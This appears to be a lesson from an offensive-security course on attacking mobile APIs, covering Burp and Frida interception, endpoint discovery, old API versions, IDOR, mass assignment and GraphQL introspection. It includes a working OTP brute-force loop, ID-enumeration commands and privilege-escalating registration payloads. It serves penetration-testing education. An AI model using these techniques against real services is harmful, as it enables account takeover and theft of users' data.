---
title: "Mobile API Attack Surface — Intercepting Mobile APIs, Hidden Endpoints, Version Abuse"
tags: [mobile, API, Burp-Suite, endpoint-discovery, version-abuse, hidden-endpoints,
       frida, OWASP-API-Top-10, IDOR, mass-assignment, deprecated-API]
module: 04-BroadSurface-03
day: 219
related_topics:
  - API Security (Days 146–160)
  - Certificate Pinning Bypass (Day 215)
  - Android Dynamic Analysis with Frida (Day 214)
  - iOS App Security Overview (Day 218)
---

# Day 219 — Mobile API Attack Surface

> "The mobile app is just a client. The API it talks to is the real target.
> And here is the thing — mobile APIs are almost always less tested than web APIs.
> They have hidden endpoints you won't find in the web app. They skip rate limits
> the web front-end enforces. They have API versions the web team deprecated
> but never turned off. You do not need to reverse the entire app. You need
> to intercept two login requests and start reading what comes back."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Configure Burp Suite to intercept HTTPS traffic from an Android device
   after bypassing certificate pinning.
2. Enumerate hidden API endpoints from intercepted mobile traffic and static
   analysis.
3. Exploit mobile-specific API vulnerabilities: deprecated version abuse,
   missing rate limiting, and response data over-disclosure.
4. Apply web API attack techniques (IDOR, mass assignment, BFLA) to the
   mobile context.
5. Use Frida to intercept and modify API requests at the HTTP client level.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| API Security (OWASP API Top 10, BOLA, mass assignment) | Days 146–160 |
| Certificate Pinning Bypass | Day 215 |
| Burp Suite usage | Days 22–24 |
| Android Dynamic Analysis with Frida | Day 214 |

---

## Part 1 — Setting Up the Interception Stack

### 1.1 — Burp Suite + Android Proxy

Full setup (assuming pinning bypassed from Day 215):

```bash
# 1. Start Burp: Proxy → Options → Add listener on 0.0.0.0:8080
# 2. On Android device: Settings → Wi-Fi → proxy → manual
#    Hostname: <your machine LAN IP>
#    Port: 8080
# 3. Download Burp CA: navigate to http://burpsuite in device browser
#    Install as trusted CA (Settings → Security → Install certificate)
# 4. Run Frida pinning bypass (if needed)
#    frida -U -f com.target.app -l ssl_bypass.js --no-pause
# 5. Use the app normally — watch Burp Proxy → HTTP History
```

### 1.2 — Capture Traffic Using tcpdump

For traffic that does not go through the proxy (e.g., apps that detect proxy
settings and fall back to direct connection):

```bash
# On rooted device: capture all traffic to a PCAP
adb shell su -c "tcpdump -i any -w /sdcard/traffic.pcap &"
# Use the app
adb shell su -c "pkill tcpdump"
adb pull /sdcard/traffic.pcap .
# Analyse in Wireshark
```

### 1.3 — Intercept with Frida at HTTP Client Level

Some apps detect the system proxy setting and bypass it. Hook OkHttp directly:

```javascript
// intercept_requests.js
Java.perform(function () {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Request = Java.use("okhttp3.Request");
    var Response = Java.use("okhttp3.Response");

    // Hook newCall to capture request details
    OkHttpClient.newCall.implementation = function (request) {
        var url = request.url().toString();
        var method = request.method();
        var headers = request.headers().toString();
        var body = "";

        if (request.body() !== null) {
            try {
                var Buffer = Java.use("okio.Buffer");
                var buf = Buffer.$new();
                request.body().writeTo(buf);
                body = buf.readUtf8();
            } catch (e) {}
        }

        console.log("\n[REQUEST] " + method + " " + url);
        console.log("Headers:\n" + headers);
        if (body) console.log("Body:\n" + body);

        return this.newCall(request);
    };
});
```

---

## Part 2 — Endpoint Discovery from Mobile Apps

Mobile apps typically communicate with more endpoints than the web application
reveals. Find them through:

### 2.1 — Traffic Analysis in Burp

After intercepting for 15–20 minutes of app usage:

```
Burp → Target → Site Map
  → Filter: show all
  → Expand the API domain
  → Note every unique path
```

Sort by path to find patterns: `/api/v1/...`, `/api/v2/...`, `/internal/...`.
Look for paths that do not appear in the web app's JS files.

### 2.2 — Static Analysis: String Extraction

From Day 212's grep patterns:

```bash
# All hardcoded URLs and path fragments
rg '"https?://[^"]+' --type java jadx_output/ -o | \
    sort -u | grep -v "//schemas\|//xmlns\|//www.w3.org"

# Path-like strings (/api/v1/..., /internal/...)
rg '"/[a-z][a-z0-9/_-]+"' --type java jadx_output/ -o | \
    sort -u | grep -v "//\|res/"

# Retrofit @GET, @POST annotations — definitive endpoint list
rg "@(GET|POST|PUT|DELETE|PATCH)\s*\(" --type java jadx_output/ -A 1 | \
    grep -E '"[^"]+"'
```

**Gold mine:** Retrofit interface files list every API endpoint the app calls:

```java
// ApiService.java — Retrofit interface
public interface ApiService {
    @GET("/api/v1/users/{userId}/profile")
    Call<UserProfile> getUserProfile(@Path("userId") String userId);

    @POST("/api/v1/admin/users/{userId}/suspend")   // admin endpoint!
    Call<Void> suspendUser(@Path("userId") String userId, @Body SuspendRequest body);

    @GET("/api/internal/debug/config")              // internal endpoint!
    Call<DebugConfig> getDebugConfig();

    @GET("/api/v2/payments/history")
    Call<PaymentHistory> getPaymentHistory(@Header("X-User-Id") String userId);
}
```

Every `@GET`/`@POST` annotation is a confirmed endpoint the app calls.
Test all of them, especially ones with `admin` or `internal` in the path.

### 2.3 — JS Analysis in Hybrid Apps

Apps built with React Native, Ionic, or Cordova bundle JavaScript:

```bash
# Find the main JS bundle
find decoded/ -name "*.js" -size +100k | head -10
find decoded/ -name "index.android.bundle" -o -name "main.jsbundle"

# Beautify (if minified)
npx js-beautify decoded/assets/index.android.bundle > bundle_pretty.js

# Extract endpoints
rg '"/(api|v[0-9]|internal|admin|graphql)' bundle_pretty.js | \
    grep -oE '"[^"]+"' | sort -u
```

---

## Part 3 — Deprecated API Version Abuse

Mobile apps must support older API versions because users do not always update.
Developers deprecate old versions but frequently do not enforce deprecation
on the server side. The server still processes requests to `/api/v1/` even
though the current app uses `/api/v3/`.

### 3.1 — Finding Deprecated Versions

```bash
# From Burp history: note the version in the path
# e.g. current app uses /api/v3/users/{id}

# Manually test older versions:
# Replace v3 with v2, v1, v0, beta, old, test, dev
# Use Burp Intruder or curl:

curl -H "Authorization: Bearer $TOKEN" \
     https://api.example.com/api/v1/users/123/profile
# If this returns data: v1 is still live

curl -H "Authorization: Bearer $TOKEN" \
     https://api.example.com/api/v2/admin/users
# If v2 has a different auth model: may bypass v3 auth controls
```

### 3.2 — Why Older Versions Are More Vulnerable

- **Missing rate limiting** — rate limits were added in v2; v1 has none
- **Missing auth checks** — RBAC added in v3; v1 returns all user data to
  any authenticated request
- **Response over-disclosure** — v1 returns full user object including `ssn`,
  `credit_card`, `internal_notes`; v2/v3 strips those fields
- **Missing CSRF protection** — old endpoints before CSRF tokens were added
- **Different parameter handling** — mass assignment not patched in v1

### 3.3 — Version Abuse in Burp

In Burp Repeater:

1. Take a current request: `GET /api/v3/users/me`
2. Duplicate the tab
3. Change to `/api/v1/users/me`, `/api/v2/users/me`, `/api/beta/users/me`
4. Compare responses — look for extra fields in older versions
5. Try IDOR: `/api/v1/users/456` where 456 is another user's ID

---

## Part 4 — Mobile-Specific API Vulnerability Patterns

### 4.1 — Response Over-Disclosure

Mobile apps display limited data on screen. The API often returns far more:

```
# Request
GET /api/v1/users/me

# Response (from Burp)
{
  "id": "usr_12345",
  "display_name": "Alice",
  "email": "alice@example.com",
  "phone": "+1234567890",             ← shown in app
  "role": "user",
  "internal_notes": "VIP customer",   ← NOT shown in app
  "ssn_last4": "1234",                ← NOT shown in app
  "payment_token": "tok_abc123xyz",   ← CRITICAL: payment token exposed
  "admin_flag": false,                ← can you set this to true?
  "balance": 150.00
}
```

Fields the app does not display are still returned. Read every response
carefully.

### 4.2 — Missing Rate Limiting

Web apps often have WAF-level rate limiting. Mobile APIs may not:

```bash
# Brute force OTP (6-digit = 1M combinations but no lockout in mobile API)
for i in $(seq 0 999999); do
    code=$(printf "%06d" $i)
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST https://api.example.com/api/v1/verify-otp \
        -H "Content-Type: application/json" \
        -d "{\"otp\": \"$code\", \"user_id\": \"usr_12345\"}")
    if [ "$response" = "200" ]; then
        echo "Found OTP: $code"
        break
    fi
done
```

In Burp Intruder: Sniper attack on the OTP parameter, 000000–999999,
watch for a 200 response.

### 4.3 — IDOR in Mobile Context

Mobile APIs frequently use numeric or sequential IDs:

```bash
# Direct object reference on a mobile API
curl -H "Authorization: Bearer $MY_TOKEN" \
     "https://api.example.com/api/v1/invoices/1001"
# Try 1002, 1003 ... 1100 — is this another user's invoice?

# Burp Intruder: payload positions on the ID, payload list = sequential numbers
# Filter by response size > 100 bytes = found invoice data
```

### 4.4 — Mass Assignment via Mobile

Mobile apps frequently include hidden admin parameters in request bodies
that the web app's form would never send:

```bash
# Normal registration request (from Burp):
POST /api/v1/users/register
{"email": "attacker@test.com", "password": "test123"}

# Try adding extra fields (mass assignment):
POST /api/v1/users/register
{
    "email": "attacker@test.com",
    "password": "test123",
    "role": "admin",              ← try elevating role
    "is_verified": true,          ← bypass email verification
    "credit_balance": 9999        ← add credits
}
```

---

## Part 5 — GraphQL via Mobile

Many mobile apps use GraphQL instead of REST. Introspection is often enabled:

```bash
# Test for GraphQL endpoint
curl -X POST https://api.example.com/graphql \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer $TOKEN" \
     -d '{"query": "{ __schema { types { name } } }"}'

# If introspection returns data: enumerate the full schema
# Use InQL (Burp plugin) or graphql-voyager
```

---

## Key Takeaways

1. **The mobile API and the web API are often different systems.** Mobile teams
   develop against a separate API version with different access controls. Test
   both independently.
2. **Deprecated API versions are the richest attack surface.** Rate limiting,
   RBAC, input validation — these were all retrofitted. The older the version,
   the more likely it skips controls added later.
3. **Response over-disclosure is universally present.** The app shows three
   fields. The API returns thirty. Read every response. Report every field
   that exposes PII, tokens, or admin-level data.
4. **Retrofit interface files are a complete endpoint catalogue.** Every `@GET`,
   `@POST`, `@PUT`, `@DELETE` annotation in the Retrofit interface is a confirmed
   endpoint. Test every one of them.
5. **Mobile API bugs pay well because they are underreported.** Most researchers
   stop at certificate pinning. Pass that gate and you are alone on the target.

---

## Exercises

1. Set up Burp Suite and configure an Android emulator as a proxy. Using
   InsecureBankv2 or any test app, intercept at least 10 API requests. For each:
   note the method, path, auth header, and response size. Build a list of
   unique API endpoints.

2. From the jadx-decompiled InsecureBankv2 code, find all Retrofit interface
   annotations (or equivalent HTTP calls). List all unique paths. Are any paths
   with `admin`, `internal`, or `debug` visible?

3. Take any intercepted API request that returns a JSON object. Try adding
   `"role": "admin"` or `"is_admin": true` to the request body. Document the
   server response. Does it return a 200 with the elevated flag applied? Does
   it return an error?

4. Using Burp Intruder, test whether the login endpoint for InsecureBankv2
   has a lockout policy. Send 100 requests with wrong passwords. Does the
   account get locked? After how many attempts?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q219.1, Q219.2 …).
> Follow-up questions use hierarchical numbering (Q219.1.1, Q219.1.2 …).

---

## Navigation

← Previous: [Day 218 — iOS App Security Overview](DAY-0218-iOS-App-Security-Overview.md)
→ Next: [Day 220 — Mobile Bug Bounty Methodology](DAY-0220-Mobile-Bug-Bounty-Methodology.md)
